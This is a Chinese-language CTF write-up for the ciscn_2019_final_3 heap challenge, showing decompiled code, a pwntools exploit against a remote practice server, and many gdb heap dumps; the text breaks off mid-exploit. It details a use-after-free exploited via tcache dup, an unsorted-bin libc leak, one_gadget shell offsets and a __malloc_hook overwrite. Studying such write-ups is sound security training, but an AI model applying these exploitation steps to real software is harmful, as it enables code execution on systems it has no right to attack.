---
layout: post
title:  ciscn_2019_final_3
date:   2021-05-17 00:01:01 +0300
image:  2021-05-17-seagull.jpg
tags:   [ctf,Pwn,ciscn2019,ubuntu18,heap,unsorted bin,tcache dup,tcache]
---

main

```assembly
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  int v4; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_C5A();
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "welcome to babyheap");
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  while ( 1 )
  {
    menu();
    std::operator<<<std::char_traits<char>>(&std::cout, "choice > ");
    std::istream::operator>>(&std::cin, &v4);
    if ( v4 == 1 )
    {
      add();
    }
    else if ( v4 == 2 )
    {
      remove();
    }
  }
}
```

add()

```assembly
unsigned __int64 add()
{
  __int64 v0; // rax
  __int64 v1; // rax
  int v2; // ebx
  __int64 v3; // rax
  size_t size; // [rsp+0h] [rbp-20h]
  unsigned __int64 v6; // [rsp+8h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, "input the index");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  std::istream::operator>>(&std::cin, (char *)&size + 4);
  if ( qword_2022A0[HIDWORD(size)] || HIDWORD(size) > 0x18 )
    exit(0);
  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "input the size");
  std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
  std::istream::operator>>(&std::cin, &size);
  if ( (unsigned int)size <= 0x78 )
  {
    v2 = HIDWORD(size);
    qword_2022A0[v2] = malloc((unsigned int)size);
    v3 = std::operator<<<std::char_traits<char>>(&std::cout, "now you can write something");
    std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
    read_in((void *)qword_2022A0[HIDWORD(size)], size);
    puts("OK!");
    printf("gift :%p\n", qword_2022A0[HIDWORD(size)]);
  }
  return __readfsqword(0x28u) ^ v6;
}
```

这里看到申请的堆最多只能有0x18

而每个堆块的size最多只能为0x78。

申请堆块时会将堆块的索引和大小size存入size变量，将堆块的指针存入qword_2022A0数组，数组大小为32。

申请到堆块后，程序会打印出堆块的地址。

remove()

```assembly
unsigned __int64 remove()
{
  __int64 v0; // rax
  unsigned int v2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, "input the index");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  std::istream::operator>>(&std::cin, &v2);
  if ( v2 > 0x18 )
    exit(0);
  free((void *)qword_2022A0[v2]);
  return __readfsqword(0x28u) ^ v3;
}
```

free掉堆块后，并没有将数组中保存的指针置0，存在漏洞。

可以通过unsortbin泄露libc地址，存在tcache的情况下，64位程序需要申请超过0x400大小chunkfree之后才能进unsortbin，所以只能通过修改chunksize。

```assembly
#-*-coding:utf-8-*-
from pwn import *

# io = process(["./ciscn_final_3"],env={"LD_PRELOAD":"./libc.so.6"})

io = remote("node3.buuoj.cn", 26075)
libc=ELF('./libc.so.6')

def add(index, size, content):
    io.recvuntil("choice > ")
    io.sendline(str(1))
    io.recvuntil("input the index")
    io.sendline(str(index))
    io.recvuntil("input the size")
    io.sendline(str(size))
    io.recvuntil("now you can write something")
    io.sendline(content)
    io.recvuntil("gift :0x")
    return int(io.recv(12), 16)

def remove(index):
    io.recvuntil("choice > ")
    io.sendline(str(2))
    io.recvuntil("input the index\n")
    io.sendline(str(index))

heap=add(0,0x78,'a') #0
print(hex(heap))
add(1,0x18,'b') #1
add(2,0x78,'c') #2
add(3,0x78,'e') #3 
add(4,0x78,'f') #4
add(5,0x78,'g') #5 
add(6,0x78,'h') #6
add(7,0x78,'i') #7 
add(8,0x78,'j') #8
add(9,0x78,'k') #9 
add(10,0x78,'l') #10
add(11,0x78,'m') #11
add(12,0x28,'n') #12
'''
head
0x56408ef40e70
'''
# 按照之前的方法使用vmmap查到heap的地址，
# 然后去查看这个地址的内容是看不到我们申请的这些堆的，
# 所以要使用程序给我们的heap的地址
'''
gdb-peda$ x/400gx 0x56408ef40e70-0x10
0x56408ef40e60:	0x0000000000000000	0x0000000000000081 0
0x56408ef40e70:	0x0000000000000a61	0x0000000000000000
0x56408ef40e80:	0x0000000000000000	0x0000000000000000
0x56408ef40e90:	0x0000000000000000	0x0000000000000000
0x56408ef40ea0:	0x0000000000000000	0x0000000000000000
0x56408ef40eb0:	0x0000000000000000	0x0000000000000000
0x56408ef40ec0:	0x0000000000000000	0x0000000000000000
0x56408ef40ed0:	0x0000000000000000	0x0000000000000000
0x56408ef40ee0:	0x0000000000000000	0x0000000000000021 1
0x56408ef40ef0:	0x0000000000000a62	0x0000000000000000
0x56408ef40f00:	0x0000000000000000	0x0000000000000081 2
0x56408ef40f10:	0x0000000000000a63	0x0000000000000000
0x56408ef40f20:	0x0000000000000000	0x0000000000000000
0x56408ef40f30:	0x0000000000000000	0x0000000000000000
0x56408ef40f40:	0x0000000000000000	0x0000000000000000
0x56408ef40f50:	0x0000000000000000	0x0000000000000000
0x56408ef40f60:	0x0000000000000000	0x0000000000000000
0x56408ef40f70:	0x0000000000000000	0x0000000000000000
0x56408ef40f80:	0x0000000000000000	0x0000000000000081 3
0x56408ef40f90:	0x0000000000000a65	0x0000000000000000
0x56408ef40fa0:	0x0000000000000000	0x0000000000000000
0x56408ef40fb0:	0x0000000000000000	0x0000000000000000
0x56408ef40fc0:	0x0000000000000000	0x0000000000000000
0x56408ef40fd0:	0x0000000000000000	0x0000000000000000
0x56408ef40fe0:	0x0000000000000000	0x0000000000000000
0x56408ef40ff0:	0x0000000000000000	0x0000000000000000
0x56408ef41000:	0x0000000000000000	0x0000000000000081 4
0x56408ef41010:	0x0000000000000a66	0x0000000000000000
0x56408ef41020:	0x0000000000000000	0x0000000000000000
0x56408ef41030:	0x0000000000000000	0x0000000000000000
0x56408ef41040:	0x0000000000000000	0x0000000000000000
0x56408ef41050:	0x0000000000000000	0x0000000000000000
0x56408ef41060:	0x0000000000000000	0x0000000000000000
0x56408ef41070:	0x0000000000000000	0x0000000000000000
0x56408ef41080:	0x0000000000000000	0x0000000000000081 5
0x56408ef41090:	0x0000000000000a67	0x0000000000000000
0x56408ef410a0:	0x0000000000000000	0x0000000000000000
0x56408ef410b0:	0x0000000000000000	0x0000000000000000
0x56408ef410c0:	0x0000000000000000	0x0000000000000000
0x56408ef410d0:	0x0000000000000000	0x0000000000000000
0x56408ef410e0:	0x0000000000000000	0x0000000000000000
0x56408ef410f0:	0x0000000000000000	0x0000000000000000
0x56408ef41100:	0x0000000000000000	0x0000000000000081 6
0x56408ef41110:	0x0000000000000a68	0x0000000000000000
0x56408ef41120:	0x0000000000000000	0x0000000000000000
0x56408ef41130:	0x0000000000000000	0x0000000000000000
0x56408ef41140:	0x0000000000000000	0x0000000000000000
0x56408ef41150:	0x0000000000000000	0x0000000000000000
0x56408ef41160:	0x0000000000000000	0x0000000000000000
0x56408ef41170:	0x0000000000000000	0x0000000000000000
0x56408ef41180:	0x0000000000000000	0x0000000000000081 7
0x56408ef41190:	0x0000000000000a69	0x0000000000000000
0x56408ef411a0:	0x0000000000000000	0x0000000000000000
0x56408ef411b0:	0x0000000000000000	0x0000000000000000
0x56408ef411c0:	0x0000000000000000	0x0000000000000000
0x56408ef411d0:	0x0000000000000000	0x0000000000000000
0x56408ef411e0:	0x0000000000000000	0x0000000000000000
0x56408ef411f0:	0x0000000000000000	0x0000000000000000
0x56408ef41200:	0x0000000000000000	0x0000000000000081 8
0x56408ef41210:	0x0000000000000a6a	0x0000000000000000
0x56408ef41220:	0x0000000000000000	0x0000000000000000
0x56408ef41230:	0x0000000000000000	0x0000000000000000
0x56408ef41240:	0x0000000000000000	0x0000000000000000
0x56408ef41250:	0x0000000000000000	0x0000000000000000
0x56408ef41260:	0x0000000000000000	0x0000000000000000
0x56408ef41270:	0x0000000000000000	0x0000000000000000
0x56408ef41280:	0x0000000000000000	0x0000000000000081 9
0x56408ef41290:	0x0000000000000a6b	0x0000000000000000
0x56408ef412a0:	0x0000000000000000	0x0000000000000000
0x56408ef412b0:	0x0000000000000000	0x0000000000000000
0x56408ef412c0:	0x0000000000000000	0x0000000000000000
0x56408ef412d0:	0x0000000000000000	0x0000000000000000
0x56408ef412e0:	0x0000000000000000	0x0000000000000000
0x56408ef412f0:	0x0000000000000000	0x0000000000000000
0x56408ef41300:	0x0000000000000000	0x0000000000000081 10
0x56408ef41310:	0x0000000000000a6c	0x0000000000000000
0x56408ef41320:	0x0000000000000000	0x0000000000000000
0x56408ef41330:	0x0000000000000000	0x0000000000000000
0x56408ef41340:	0x0000000000000000	0x0000000000000000
0x56408ef41350:	0x0000000000000000	0x0000000000000000
0x56408ef41360:	0x0000000000000000	0x0000000000000000
0x56408ef41370:	0x0000000000000000	0x0000000000000000
0x56408ef41380:	0x0000000000000000	0x0000000000000081 11
0x56408ef41390:	0x0000000000000a6d	0x0000000000000000
0x56408ef413a0:	0x0000000000000000	0x0000000000000000
0x56408ef413b0:	0x0000000000000000	0x0000000000000000
0x56408ef413c0:	0x0000000000000000	0x0000000000000000
0x56408ef413d0:	0x0000000000000000	0x0000000000000000
0x56408ef413e0:	0x0000000000000000	0x0000000000000000
0x56408ef413f0:	0x0000000000000000	0x0000000000000000
0x56408ef41400:	0x0000000000000000	0x0000000000000031 12
0x56408ef41410:	0x0000000000000a6e	0x0000000000000000
0x56408ef41420:	0x0000000000000000	0x0000000000000000
0x56408ef41430:	0x0000000000000000	0x000000000000ebd1
'''

remove(12)
remove(12)
'''
0x558b9c681400:	0x0000000000000000	0x0000000000000031
0x558b9c681410:	0x0000558b9c681410	0x0000000000000000
0x558b9c681420:	0x0000000000000000	0x0000000000000000
0x558b9c681430:	0x0000000000000000	0x000000000000ebd1
'''
# 可以看到利用tcache_dup使得fd指向了自己的地址
# 将该地址修改为chunk0 size的地址
# 这样当dup申请的时候，就会将堆申请到chunk0 size的地址
add(13,0x28, p64(heap-0x10))
'''
0x5615e0b06400:	0x0000000000000000	0x0000000000000031
0x5615e0b06410:	0x00005615e0b05e60	0x000000000000000a
0x5615e0b06420:	0x0000000000000000	0x0000000000000000
0x5615e0b06430:	0x0000000000000000	0x000000000000ebd1
'''

add(14,0x28, p64(heap-0x10))
'''
0x557152006400:	0x0000000000000000	0x0000000000000031
0x557152006410:	0x0000557152005e60	0x000000000000000a
0x557152006420:	0x0000000000000000	0x0000000000000000
0x557152006430:	0x0000000000000000	0x000000000000ebd1
'''

add(15,0x28,p64(0)+p64(0x421))
'''
gdb-peda$ x/400gx 0x55905885de70-0x10
0x55905885de60:	0x0000000000000000	0x0000000000000421
0x55905885de70:	0x0000000000000a0a	0x0000000000000000
0x55905885de80:	0x0000000000000000	0x0000000000000000
0x55905885de90:	0x0000000000000000	0x0000000000000000
0x55905885dea0:	0x0000000000000000	0x0000000000000000
0x55905885deb0:	0x0000000000000000	0x0000000000000000
0x55905885dec0:	0x0000000000000000	0x0000000000000000
0x55905885ded0:	0x0000000000000000	0x0000000000000000
0x55905885dee0:	0x0000000000000000
'''

remove(0)
'''
gdb-peda$ x/100gx 0x5641ee9b3e70-0x10
0x5641ee9b3e60:	0x0000000000000000	0x0000000000000421
0x5641ee9b3e70:	0x00007f27bc454ca0	0x00007f27bc454ca0
0x5641ee9b3e80:	0x0000000000000000	0x0000000000000000
0x5641ee9b3e90:	0x0000000000000000	0x0000000000000000
0x5641ee9b3ea0:	0x0000000000000000	0x0000000000000000
0x5641ee9b3eb0:	0x0000000000000000	0x0000000000000000
0x5641ee9b3ec0:	0x0000000000000000	0x0000000000000000
0x5641ee9b3ed0:	0x0000000000000000	0x0000000000000000
0x5641ee9b3ee0:	0x0000000000000000	0x0000000000000021
0x5641ee9b3ef0:	0x0000000000000a62	0x0000000000000000
0x5641ee9b3f00:	0x0000000000000000	
'''
'''
gdb-peda$ x/20gx 0x00007f27bc454ca0
0x7f27bc454ca0:	0x00005641ee9b4430	0x0000000000000000
0x7f27bc454cb0:	0x00005641ee9b3e60	0x00005641ee9b3e60
'''
# free的堆块进入了unsorted bin

remove(1)
'''
gdb-peda$ x/30gx 0x5564479cee70-0x10
0x5564479cee60:	0x0000000000000000	0x0000000000000421
0x5564479cee70:	0x00007f9e84d78ca0	0x00007f9e84d78ca0
0x5564479cee80:	0x0000000000000000	0x0000000000000000
0x5564479cee90:	0x0000000000000000	0x0000000000000000
0x5564479ceea0:	0x0000000000000000	0x0000000000000000
0x5564479ceeb0:	0x0000000000000000	0x0000000000000000
0x5564479ceec0:	0x0000000000000000	0x0000000000000000
0x5564479ceed0:	0x0000000000000000	0x0000000000000000
0x5564479ceee0:	0x0000000000000000	0x0000000000000021
0x5564479ceef0:	0x0000000000000000	0x0000000000000000
0x5564479cef00:	0x0000000000000000	
'''
# tcache
'''
gdb-peda$ x/100gx 0x00005564479bd000
0x5564479bd000:	0x0000000000000000	0x0000000000000251
0x5564479bd010:	0x000000000000ff01	0x0000000000000000
0x5564479bd020:	0x0000000000000000	0x0000000000000000
0x5564479bd030:	0x0000000000000000	0x0000000000000000
0x5564479bd040:	0x0000000000000000	0x0000000000000000
0x5564479bd050:	0x00005564479ceef0	0x0000000000000000 1
0x5564479bd060:	0x0000000000000000	0x0000000000000000
'''
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5564479cf430 (size : 0xebd0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x5564479cee60 (overlap chunk with 0x5564479ceee0(freed) )
(0x20)   tcache_entry[0](1): 0x5564479ceef0
(0x30)   tcache_entry[1](255): 0
'''

add(16,0x78,'o')
'''
gdb-peda$ x/30gx 0x5564479cee70-0x10
0x5564479cee60:	0x0000000000000000	0x0000000000000421
0x5564479cee70:	0x00007f9e84d78ca0	0x00007f9e84d78ca0
0x5564479cee80:	0x0000000000000000	0x0000000000000000
0x5564479cee90:	0x0000000000000000	0x0000000000000000
0x5564479ceea0:	0x0000000000000000	0x0000000000000000
0x5564479ceeb0:	0x0000000000000000	0x0000000000000000
0x5564479ceec0:	0x0000000000000000	0x0000000000000000
0x5564479ceed0:	0x0000000000000000	0x0000000000000000
0x5564479ceee0:	0x0000000000000000	0x0000000000000021
0x5564479ceef0:	0x0000000000000000	0x0000000000000000
0x5564479cef00:	0x0000000000000000	
'''
# tcache
'''
gdb-peda$ x/100gx 0x00005564479bd000
0x5564479bd000:	0x0000000000000000	0x0000000000000251
0x5564479bd010:	0x000000000000ff01	0x0000000000000000
0x5564479bd020:	0x0000000000000000	0x0000000000000000
0x5564479bd030:	0x0000000000000000	0x0000000000000000
0x5564479bd040:	0x0000000000000000	0x0000000000000000
0x5564479bd050:	0x00005564479ceef0	0x0000000000000000 1
0x5564479bd060:	0x0000000000000000	0x0000000000000000
'''
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5564479cf430 (size : 0xebd0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x5564479cee60 (overlap chunk with 0x5564479ceee0(freed) )
(0x20)   tcache_entry[0](1): 0x5564479ceef0
(0x30)   tcache_entry[1](255): 0
'''
# 用unsorted bin的fd，覆盖tcache的fd
# 这样，再第二次申请块的时候，就会申请在unsorted bin的基地址
# 也就是main_arena+96的地方


add(17,0x18,'pp')
'''
gdb-peda$ x/100gx 0x55e3d1b0de70-0x10
0x55e3d1b0de60:	0x0000000000000000	0x0000000000000081
0x55e3d1b0de70:	0x00007f9f4a7b0a6f	0x00007f9f4a7bf090
0x55e3d1b0de80:	0x000055e3d1b0de60	0x000055e3d1b0de60
0x55e3d1b0de90:	0x0000000000000000	0x0000000000000000
0x55e3d1b0dea0:	0x0000000000000000	0x0000000000000000
0x55e3d1b0deb0:	0x0000000000000000	0x0000000000000000
0x55e3d1b0dec0:	0x0000000000000000	0x0000000000000000
0x55e3d1b0ded0:	0x0000000000000000	0x0000000000000000
0x55e3d1b0dee0:	0x0000000000000000	0x00000000000003a1
0x55e3d1b0def0:	0x00007f9f4a0a7070	0x00007f9f4a7beca0
0x55e3d1b0df00:	0x0000000000000000	0x0000000000000081
0x55e3d1b0df10:	0x0000000000000a63	0x0000000000000000
'''
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55e3d1b0e430 (size : 0xebd0) 
       last_remainder: 0x55e3d1b0dee0 (size : 0x3a0) 
            unsortbin: 0x55e3d1b0dee0 (doubly linked list corruption 0x55e3d1b0dee0 != 0xd00220003b0b3 and 0x7f9f4a0a7070 or 0x55e3d1b0dee0 is broken)
(0x20)   tcache_entry[0](0): 0x7f9f4a7beca0 --> 0x55e3d1b0e430
(0x30)   tcache_entry[1](255): 0
'''
# 通过看(0x20)tcache_entry[0]可知
# 再申请块就会申请到0x7f9f4a7beca0


'''
[+]libc version : glibc 2.27
[+]build ID : BuildID[sha1]=b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0
[+]main_arena_offset : 0x3ebc40
'''
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
libc_base = add(18,0x18,'qq') - 0x3ebc40 - 96
'''
gdb-peda$ x/20gx 0x7fd6af049ca0-0x10
0x7fd6af049c90 <main_arena+80>:	0x0000000000000000	0x0000000000000000
0x7fd6af049ca0 <main_arena+96>:	0x00005613560a7171	0x0000561356722ee0
0x7fd6af049cb0 <main_arena+112>:	0x0000561356722ee0	0x0000561356722ee0
'''
malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + 0x10a38c


# dup
remove(5)
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55d6190a7171 (size : 0x0) (invaild memory) 
       last_remainder: 0x55d619c1dee0 (size : 0x3a0) 
            unsortbin: 0x55d619c1dee0 (invaild memory)
(0x20)   tcache_entry[0](255): 0x55d619c1e430
(0x30)   tcache_entry[1](255): 0
(0x80)   tcache_entry[6](1): 0x55d619c1e090
'''

remove(5)
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5636340a7171 (size : 0x0) (invaild memory) 
       last_remainder: 0x5636344a5ee0 (size : 0x3a0) 
            unsortbin: 0x5636344a5ee0 (invaild memory)
(0x20)   tcache_entry[0](255): 0x5636344a6430
(0x30)   tcache_entry[1](255): 0
(0x80)   tcache_entry[6](2): 0x5636344a6090 --> 0x5636344a6090 (overlap chunk with 0x5636344a6080(freed) )
'''
'''
gdb-peda$ x/100gx 0x5636344a5e70-0x10
0x5636344a5e60:	0x0000000000000000	0x0000000000000081
0x5636344a5e70:	0x00007f1993890a6f	0x00007f199389c090
0x5636344a5e80:	0x00005636344a5e60	0x00005636344a5e60
0x5636344a5e90:	0x0000000000000000	0x0000000000000000
0x5636344a5ea0:	0x0000000000000000	0x0000000000000000
0x5636344a5eb0:	0x0000000000000000	0x0000000000000000
0x5636344a5ec0:	0x0000000000000000	0x0000000000000000
0x5636344a5ed0:	0x0000000000000000	0x0000000000000000
0x5636344a5ee0:	0x0000000000000000	0x00000000000003a1
0x5636344a5ef0:	0x00007f19930a7070	0x00007f199389bca0
0x5636344a5f00:	0x0000000000000000	0x0000000000000081
0x5636344a5f10:	0x0000000000000a63	0x0000000000000000
0x5636344a5f20:	0x0000000000000000	0x0000000000000000
0x5636344a5f30:	0x0000000000000000	0x0000000000000000
0x5636344a5f40:	0x0000000000000000	0x0000000000000000
0x5636344a5f50:	0x0000000000000000	0x0000000000000000
0x5636344a5f60:	0x0000000000000000	0x0000000000000000
0x5636344a5f70:	0x0000000000000000	0x0000000000000000
0x5636344a5f80:	0x0000000000000000	0x0000000000000081
0x5636344a5f90:	0x0000000000000a65	0x0000000000000000
0x5636344a5fa0:	0x0000000000000000	0x0000000000000000
0x5636344a5fb0:	0x0000000000000000	0x0000000000000000
0x5636344a5fc0:	0x0000000000000000	0x0000000000000000
0x5636344a5fd0:	0x0000000000000000	0x0000000000000000
0x5636344a5fe0:	0x0000000000000000	0x0000000000000000
0x5636344a5ff0:	0x0000000000000000	0x0000000000000000
0x5636344a6000:	0x0000000000000000	0x0000000000000081
0x5636344a6010:	0x0000000000000a66	0x0000000000000000
0x5636344a6020:	0x0000000000000000	0x0000000000000000
0x5636344a6030:	0x0000000000000000	0x0000000000000000
0x5636344a6040:	0x0000000000000000	0x0000000000000000
0x5636344a6050:	0x0000000000000000	0x0000000000000000
0x5636344a6060:	0x0000000000000000	0x0000000000000000
0x5636344a6070:	0x0000000000000000	0x0000000000000000
0x5636344a6080:	0x0000000000000000	0x0000000000000081
0x5636344a6090:	0x00005636344a6090	0x0000000000000000
0x5636344a60a0:	0x0000000000000000	0x0000000000000000
0x5636344a60b0:	0x0000000000000000	0x0000000000000000
0x5636344a60c0:	0x0000000000000000	0x0000000000000000
0x5636344a60d0:	0x0000000000000000	0x0000000000000000
0x5636344a60e0:	0x0000000000000000	0x0000000000000000
0x5636344a60f0:	0x0000000000000000	0x0000000000000000
0x5636344a6100:	0x0000000000000000
'''

add(19,0x78,p64(malloc_hook))
'''
gdb-peda$ x/100gx 0x5568a24eae70-0x10
0x5568a24eae60:	0x0000000000000000	0x0000000000000081
0x5568a24eae70:	0x00007f6cfa170a6f	0x00007f6cfa17f090
0x5568a24eae80:	0x00005568a24eae60	0x00005568a24eae60
0x5568a24eae90:	0x0000000000000000	0x0000000000000000
0x5568a24eaea0:	0x0000000000000000	0x0000000000000000
0x5568a24eaeb0:	0x0000000000000000	0x0000000000000000
0x5568a24eaec0:	0x0000000000000000	0x0000000000000000
0x5568a24eaed0:	0x0000000000000000	0x0000000000000000
0x5568a24eaee0:	0x0000000000000000	0x00000000000003a1
0x5568a24eaef0:	0x00007f6cfa0a7070	0x00007f6cfa17eca0
0x5568a24eaf00:	0x0000000000000000	0x0000000000000081
0x5568a24eaf10:	0x0000000000000a63	0x0000000000000000
0x5568a24eaf20:	0x0000000000000000	0x0000000000000000
0x5568a24eaf30:	0x0000000000000000	0x0000000000000000
0x5568a24eaf40:	0x0000000000000000	0x0000000000000000
0x5568a24eaf50:	0x0000000000000000	0x0000000000000000
0x5568a24eaf60:	0x0000000000000000	0x0000000000000000
0x5568a24eaf70:	0x0000000000000000	0x0000000000000000
0x5568a24eaf80:	0x0000000000000000	0x0000000000000081
0x5568a24eaf90:	0x0000000000000a65	0x0000000000000000
0x5568a24eafa0:	0x0000000000000000	0x0000000000000000
0x5568a24eafb0:	0x0000000000000000	0x0000000000000000
0x5568a24eafc0:	0x0000000000000000	0x0000000000000000
0x5568a24eafd0:	0x0000000000000000	0x0000000000000000
0x5568a24eafe0:	0x0000000000000000	0x0000000000000000
0x5568a24eaff0:	0x0000000000000000	0x0000000000000000
0x5568a24eb000:	0x0000000000000000	0x0000000000000081
0x5568a24eb010:	0x0000000000000a66	0x0000000000000000
0x5568a24eb020:	0x0000000000000000	0x0000000000000000
0x5568a24eb030:	0x0000000000000000	0x0000000000000000
0x5568a24eb040:	0x0000000000000000	0x0000000000000000
0x5568a24eb050:	0x0000000000000000	0x0000000000000000
0x5568a24eb060:	0x0000000000000000	0x0000000000000000
0x5568a24eb070:	0x0000000000000000	0x0000000000000000
0x5568a24eb080:	0x0000000000000000	0x0000000000000081
0x5568a24eb090:	0x00007f6cfa142c30	0x000000000000000a
0x5568a24eb0a0:	0x0000000000000000	0x0000000000000000
0x5568a24eb0b0:	0x0000000000000000	0x0000000000000000
0x5568a24eb0c0:	0x0000000000000000	0x0000000000000000
0x5568a24eb0d0:	0x0000000000000000	0x0000000000000000
0x5568a24eb0e0:	0x0000000000000000	0x0000000000000000
0x5568a24eb0f0:	0x0000000000000000	0x0000000000000000
0x5568a24eb100:	0x0000000000000000	
'''
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5568a20a7171 (size : 0x0) (invaild memory) 
       last_remainder: 0x5568a24eaee0 (size : 0x3a0) 
            unsortbin: 0x5568a24eaee0 (doubly linked list corruption 0x5568a24eaee0 != 0xd61800000ab41238 and 0x7f6cfa0a7070 or 0x5568a24eaee0 is broken)
(0x20)   tcache_entry[0](255): 0x5568a24eb430
(0x30)   tcache_entry[1](255): 0
(0x80)   tcache_entry[6](1): 0x5568a24eb090 --> 0x7f6cfa142c30 --> 0x545a03000000 (invaild memory)
'''

add(20,0x78,p64(malloc_hook))
'''
gdb-peda$ x/100gx 0x55c2c6d0ce70-0x10
0x55c2c6d0ce60:	0x0000000000000000	0x0000000000000081
0x55c2c6d0ce70:	0x00007f4c20920a6f	0x00007f4c20928090
0x55c2c6d0ce80:	0x000055c2c6d0ce60	0x000055c2c6d0ce60
0x55c2c6d0ce90:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cea0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0ceb0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cec0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0ced0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cee0:	0x0000000000000000	0x00000000000003a1
0x55c2c6d0cef0:	0x00007f4c200a7070	0x00007f4c20927ca0
0x55c2c6d0cf00:	0x0000000000000000	0x0000000000000081
0x55c2c6d0cf10:	0x0000000000000a63	0x0000000000000000
0x55c2c6d0cf20:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cf30:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cf40:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cf50:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cf60:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cf70:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cf80:	0x0000000000000000	0x0000000000000081
0x55c2c6d0cf90:	0x0000000000000a65	0x0000000000000000
0x55c2c6d0cfa0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cfb0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cfc0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cfd0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cfe0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0cff0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d000:	0x0000000000000000	0x0000000000000081
0x55c2c6d0d010:	0x0000000000000a66	0x0000000000000000
0x55c2c6d0d020:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d030:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d040:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d050:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d060:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d070:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d080:	0x0000000000000000	0x0000000000000081
0x55c2c6d0d090:	0x00007f4c208ebc30	0x000000000000000a
0x55c2c6d0d0a0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d0b0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d0c0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d0d0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d0e0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d0f0:	0x0000000000000000	0x0000000000000000
0x55c2c6d0d100:	0x0000000000000000
'''
'''
gdb-peda$ heapinfo
